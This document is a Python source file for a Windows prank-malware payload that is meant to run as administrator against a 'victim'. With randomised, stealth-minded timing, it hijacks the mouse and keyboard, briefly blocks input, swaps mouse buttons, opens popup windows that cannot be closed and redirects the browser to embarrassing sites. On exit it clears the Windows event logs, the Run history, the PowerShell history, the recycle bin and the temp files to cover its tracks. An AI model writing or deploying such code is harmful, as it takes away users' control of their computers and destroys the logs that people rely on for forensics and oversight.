# This has to be executed as admin
# Entry script should already handle this

# I know this is a mess, but keeping in one file makes it easier to download
# no idea why I decided to lazyload everything
# —————————————————Housekeeping——————————————————

import os

def is_admin() -> bool:
    try:
        # only windows users with admin privileges can read the C:\windows\temp
        _ = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
        return True
    except OSError:
        return False        


def cleanup() -> None:
    import subprocess
    import winreg as reg
    
    # Clean up some stuff
    # WIN + R history
    with reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", 0, reg.KEY_SET_VALUE) as key:
        i = 0
        while True:
            try:

                reg.DeleteValue(key, reg.EnumValue(key, i)[0])
                i += 1
            except OSError:
                break
    # Clear event logs, recycle bin, PSReadline history, and temp files
    subprocess.run(['powershell.exe', '-Command', 'Clear-EventLog -LogName Application, System, Security, \"Windows PowerShell\"'], shell=True)
    subprocess.run(['powershell.exe', '-Command', 'Clear-RecycleBin -Confirm:$false'], shell=True)
    subprocess.run(['powershell.exe', '-Command', 'Remove-Item' '(Get-PSreadlineOption).HistorySavePath'], shell=True)
    subprocess.run(['cmd.exe', '/c', 'rmdir', '/s', '/q', '%localappdata%\\Temp'], shell=True)

import atexit
atexit.register(cleanup)

# —————————————————Imports——————————————————
import ctypes
import time
import random
from typing import Callable
import threading

# —————————————————Mouse Funcs——————————————————
# Modified from <https://github.com/boppreh/mouse>.

from ctypes import c_int32, c_int, c_long, byref, Structure
from ctypes.wintypes import DWORD

user32 = ctypes.WinDLL('user32', use_last_error = True)

LEFT = 'left'
RIGHT = 'right'
MIDDLE = 'middle'
WHEEL = 'wheel'
X = 'x'

UP = 'up'
DOWN = 'down'
DOUBLE = 'double'
VERTICAL = 'vertical'
HORIZONTAL = 'horizontal'

class MSLLHOOKSTRUCT(Structure):
    _fields_ = [("x", c_long),
                ("y", c_long),
                ('data', c_int32),
                ('reserved', c_int32),
                ("flags", DWORD),
                ("time", c_int),
                ]
# Beware, as of 2016-01-30 the official docs have a very incomplete list.
# This one was compiled from experience and may be incomplete.
WM_MOUSEMOVE = 0x200
WM_LBUTTONDOWN = 0x201
WM_LBUTTONUP = 0x202
WM_LBUTTONDBLCLK = 0x203
WM_RBUTTONDOWN = 0x204
WM_RBUTTONUP = 0x205
WM_RBUTTONDBLCLK = 0x206
WM_MBUTTONDOWN = 0x207
WM_MBUTTONUP = 0x208
WM_MBUTTONDBLCLK = 0x209
WM_MOUSEWHEEL = 0x20A
WM_XBUTTONDOWN = 0x20B
WM_XBUTTONUP = 0x20C
WM_XBUTTONDBLCLK = 0x20D
WM_NCXBUTTONDOWN = 0x00AB
WM_NCXBUTTONUP = 0x00AC
WM_NCXBUTTONDBLCLK = 0x00AD
WM_MOUSEHWHEEL = 0x20E
WM_LBUTTONDOWN = 0x0201
WM_LBUTTONUP = 0x0202
WM_MOUSEMOVE = 0x0200
WM_MOUSEWHEEL = 0x020A
WM_MOUSEHWHEEL = 0x020E
WM_RBUTTONDOWN = 0x0204
WM_RBUTTONUP = 0x0205

buttons_by_wm_code = {
    WM_LBUTTONDOWN: (DOWN, LEFT),
    WM_LBUTTONUP: (UP, LEFT),
    WM_LBUTTONDBLCLK: (DOUBLE, LEFT),

    WM_RBUTTONDOWN: (DOWN, RIGHT),
    WM_RBUTTONUP: (UP, RIGHT),
    WM_RBUTTONDBLCLK: (DOUBLE, RIGHT),

    WM_MBUTTONDOWN: (DOWN, MIDDLE),
    WM_MBUTTONUP: (UP, MIDDLE),
    WM_MBUTTONDBLCLK: (DOUBLE, MIDDLE),

    WM_XBUTTONDOWN: (DOWN, X),
    WM_XBUTTONUP: (UP, X),
    WM_XBUTTONDBLCLK: (DOUBLE, X),
}

MOUSEEVENTF_ABSOLUTE = 0x8000
MOUSEEVENTF_MOVE = 0x1
MOUSEEVENTF_WHEEL = 0x800
MOUSEEVENTF_HWHEEL = 0x1000
MOUSEEVENTF_LEFTDOWN = 0x2
MOUSEEVENTF_LEFTUP = 0x4
MOUSEEVENTF_RIGHTDOWN = 0x8
MOUSEEVENTF_RIGHTUP = 0x10
MOUSEEVENTF_MIDDLEDOWN = 0x20
MOUSEEVENTF_MIDDLEUP = 0x40
MOUSEEVENTF_XDOWN = 0x0080
MOUSEEVENTF_XUP = 0x0100

simulated_mouse_codes = {
    (WHEEL, HORIZONTAL): MOUSEEVENTF_HWHEEL,
    (WHEEL, VERTICAL): MOUSEEVENTF_WHEEL,

    (DOWN, LEFT): MOUSEEVENTF_LEFTDOWN,
    (UP, LEFT): MOUSEEVENTF_LEFTUP,

    (DOWN, RIGHT): MOUSEEVENTF_RIGHTDOWN,
    (UP, RIGHT): MOUSEEVENTF_RIGHTUP,

    (DOWN, MIDDLE): MOUSEEVENTF_MIDDLEDOWN,
    (UP, MIDDLE): MOUSEEVENTF_MIDDLEUP,

    (DOWN, X): MOUSEEVENTF_XDOWN,
    (UP, X): MOUSEEVENTF_XUP,
}

NULL = c_int(0)

WHEEL_DELTA = 120


def _translate_button(button):
    if button.startswith(X):
        return X, 1 if X == button else 2
    else:
        return button, 0

def press(button=LEFT):
    button, data = _translate_button(button)
    code = simulated_mouse_codes[(DOWN, button)]
    user32.mouse_event(code, 0, 0, data, 0)

def release(button=LEFT):
    button, data = _translate_button(button)
    code = simulated_mouse_codes[(UP, button)]
    user32.mouse_event(code, 0, 0, data, 0)

def wheel(delta=1):
    code = simulated_mouse_codes[(WHEEL, VERTICAL)]
    user32.mouse_event(code, 0, 0, int(delta * WHEEL_DELTA), 0)

def move_to(x, y):
    user32.SetCursorPos(int(x), int(y))

class POINT(Structure):
    _fields_ = [("x", c_long), ("y", c_long)]

def get_position():
    point = POINT()
    user32.GetCursorPos(byref(point))
    return (point.x, point.y)


def click(button=LEFT):
    """ Sends a click with the given button. """
    press(button)
    release(button)

def move(x, y, absolute=True, duration=0.0, steps_per_second=120.0):
    x = int(x)
    y = int(y)

    # Requires an extra system call on Linux, but `move_relative` is measured
    # in millimeters so we would lose precision.
    position_x, position_y = get_position()

    if not absolute:
        x = position_x + x
        y = position_y + y

    if not duration:
        move_to(x, y)
        return
    
    start_x = position_x
    start_y = position_y
    dx = x - start_x
    dy = y - start_y

    if dx == 0 and dy == 0:
        time.sleep(duration)
        return

    intervaltime = 1.0/steps_per_second
    starttime = time.perf_counter()
    endtime = starttime + float(duration)
    step_starttime = starttime
    iteration_starttime = starttime
    while iteration_starttime < endtime:
        # Sleep to enforce the fps cap, considering the last step's duration and remaining time
        last_step_duration = iteration_starttime - step_starttime
        remainingtime = endtime - iteration_starttime
        corrected_sleeptime = intervaltime - last_step_duration
        actual_sleeptime = min(remainingtime, corrected_sleeptime)
        if actual_sleeptime > 0:
            time.sleep(actual_sleeptime)
        step_starttime = time.perf_counter()

        # Move based on the elapsed time to ensure that the duration is valid
        currenttime = step_starttime - starttime
        progress = currenttime / duration
        move_to(start_x + dx*progress, start_y + dy*progress)
        iteration_starttime = time.perf_counter()

    # Move to the destination to ensure the final position
    move_to(start_x + dx, start_y + dy)
# END Mouse Funcs


# —————————————————START ACTUAL PAYLOAD—————————————————

# Feature 1 - Input Manipulation
def mouse_malfunction() -> Callable:
    # Thanks to https://github.com/boppreh/mouse for the mouse functions 
    """Returns a random function that will create unexpected behaviour with the victim's mouse."""
    def move_mouse_randomly():  
        move(random.randint(-100, 100), random.randint(-100, 100), absolute=False, duration=0.5)
        time.sleep(random.uniform(0.5, 2))  # Random delay between movements
    
    def random_clicks():
        button = random.choice([LEFT, RIGHT, MIDDLE])
        click(button)
        time.sleep(random.uniform(0.5, 2))

    def random_wheel_scroll():
        wheel(random.choice([-1, 1]) * random.randint(1, 3))
    
    def double_click():
        """Change doublie click threshold"""
        # Basically only affects text selection :c
        if random.random() < 0.5:
            user32.SetDoubleClickTime(5000)
        else:
            user32.SetDoubleClickTime(1)
        
    def swap_mouse_buttons():
        current_state = user32.GetSystemMetrics(23) # SM_SWAPBUTTON - 0 if default, not zero if swap
        match current_state:
            case 0:
                user32.SwapMouseButton(True)  # Swap mouse buttons
            case _:
                user32.SwapMouseButton(False)  # Restore default mouse buttons

    def cursor_trail():
        user32.SystemParametersInfoW(0x005D, 10, None, 0) # Turn cursor trail on
    

    def sensitivity():
        new_sense = random.randint(1, 20)  # Random sensitivity between 1 and 20
        user32.SystemParametersInfoW(0x0071, 0, new_sense, 0)  # SPI_SETMOUSESPEED

    while True:
        time.sleep(random.randint(30, 300))  # try stay steathy hopefully lol
        random.choice([move_mouse_randomly, random_clicks, random_wheel_scroll, double_click, swap_mouse_buttons, cursor_trail, sensitivity])()
        


def keyboard_malfunction() -> Callable:
    def block_input():
        """Block input for a short time to confuse the user."""
        user32.BlockInput(True)  
        time.sleep(random.random())  # 0-1 sec just long enough to mess with them but they don't realise
        user32.BlockInput(False) 
    
    def random_key_presses():
        """Randomly presses keys to disrupt the user."""
        A = 0x41  # Virtual key code for  A
        Z = 0x5A  # '                  '  Z    
        keys = list(range(A, Z + 1))
        key = random.choice(keys)
        user32.keybd_event(key, 0, 0, 0)
        user32.keybd_event(key, 0, 2, 0)  
        time.sleep(random.uniform(0.5, 2))  # Not sure if this is needed
    
    def broken_caps_lock():
        """Toggle Caps Lock on and off to confuse the user."""
        user32.keybd_event(0x14, 0, 0, 0)  # Caps Lock key code
        time.sleep(random.uniform(0.5, 2))
        user32.keybd_event(0x14, 0, 2, 0)
    
    
    while True:
        time.sleep(random.randint(30, 300))
        random.choice([block_input, random_key_presses, broken_caps_lock])()
        


# Feature 2 - Random popup windows, no idea how to do this yet...
def funny_windows():
    """Make funny popup windows"""
    import json, io, PIL.ImageTk, PIL.Image
    from urllib.request import urlopen, Request
    import tkinter as tk

    url = 'https://cataas.com/cat?type=square&position=center&width=1000&height=1000&json=true'


    root = tk.Tk()
    root.withdraw()  # Hide the root window

    last_window = {} # Track the window we need to close

    def show_cat():

        if last_window.get('window'):
            last_window['window'].destroy()

        response = json.loads(urlopen(url).read().decode('utf-8'))
        print(response)
        window = tk.Toplevel()
        window.resizable(False, False)

        def _():
            pass
        
        # Hehe
        window.protocol("WM_DELETE_WINDOW", _)
        window.protocol("WM_ICONIFY", _)

        image_content_url, mime_type = response['url'], response['mimetype'][6:]
        print(f"Image URL: {image_content_url}, MIME Type: {mime_type}")
        image_data = urlopen(image_content_url).read()
        print(f"Image data length: {len(image_data)} bytes")

        image = PIL.Image.open(io.BytesIO(image_data))
        image = PIL.ImageTk.PhotoImage(image, format=mime_type)

        canvas = tk.Canvas(window, width=image.width(), height=image.height())
        canvas.create_image(0, 0, image=image, anchor='nw')
        canvas.pack(padx=0, pady=0)

        window.title("Meow :3")
        window.image = image
        window.update()
        last_window['window'] = window

        # Schedule next popup
        delay = random.randint(5, 10) * 1000  # milliseconds
        root.after(delay, show_cat)

    # Start the first popup
    root.after(0, show_cat)
    root.mainloop()


# Feature 3 - Randomly open sub funny sites

def redirects():
    """Randomly sends victim to funny places"""
    import webbrowser
    sites = [
        'https://www.youtube.com/watch?v=dQw4w9WgXcQ', # RIckroll
        'https://shipping.fandom.com/wiki/My_Hero_Academia',
        'https://www.google.com/search?q=Do%20I%20have%20Syphilis',
        'https://www.youtube.com/watch?v=XqZsoesa55w' # Baby Shark
    ]
    while True:
        time.sleep(random.randint(60, 600))
        webbrowser.open(random.choice(sites))


# Example usage for now
def main():
    threading.Thread(target=mouse_malfunction()).start()
    threading.Thread(target=keyboard_malfunction()).start()
    threading.Thread(target=redirects).start()
    threading.Thread(target=funny_windows).start()



if __name__ == "__main__":
    while True:
        try:
            main()
            break
        except: # catch everything who cares
            pass